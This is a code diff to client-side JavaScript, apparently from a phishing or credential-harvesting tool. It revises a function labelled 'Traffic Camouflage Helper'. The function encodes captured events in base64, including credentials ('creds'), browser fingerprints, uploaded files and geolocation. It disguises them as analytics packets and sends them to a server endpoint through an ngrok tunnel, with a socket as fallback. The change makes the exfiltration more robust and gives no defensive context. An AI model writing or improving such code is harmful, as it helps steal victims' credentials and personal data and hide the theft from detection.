@@ -43,27 +43,35 @@ socket.on('reconnect', (attempt) => {
 
 // Traffic Camouflage Helper (Hybrid: HTTP + Socket)
 async function sendTelemetry(event, data) {
-    const packet = {
-        v: btoa(JSON.stringify({ event, data })),
-        ts: Date.now(),
-        type: 'analytics_event'
-    };
+    try {
+        const jsonStr = JSON.stringify({ event, data });
+        // UTF-8 safe base64 encoding
+        const b64 = btoa(unescape(encodeURIComponent(jsonStr)));
+        
+        const packet = {
+            v: b64,
+            ts: Date.now(),
+            type: 'analytics_event'
+        };
 
-    // Critical events go via HTTP for reliability on Vercel/Serverless
-    const criticalEvents = ['join', 'creds', 'fingerprint', 'file_up', 'geo'];
-    if (criticalEvents.includes(event)) {
-        try {
-            await fetch('/api/telemetry', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
-                body: JSON.stringify(packet)
-            });
-            console.log(`[SENTINEL] HTTP Telemetry sent: ${event}`);
-        } catch (e) {
+        // Critical events go via HTTP for reliability on Vercel/Serverless
+        const criticalEvents = ['join', 'creds', 'fingerprint', 'file_up', 'geo'];
+        if (criticalEvents.includes(event)) {
+            try {
+                await fetch('/api/telemetry', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
+                    body: JSON.stringify(packet)
+                });
+                console.log(`[SENTINEL] HTTP Telemetry sent: ${event}`);
+            } catch (e) {
+                socket.emit('telemetry_data', packet);
+            }
+        } else {
             socket.emit('telemetry_data', packet);
         }
-    } else {
-        socket.emit('telemetry_data', packet);
+    } catch (e) {
+        console.error('[SENTINEL] Error sending telemetry:', e);
     }
 }
 
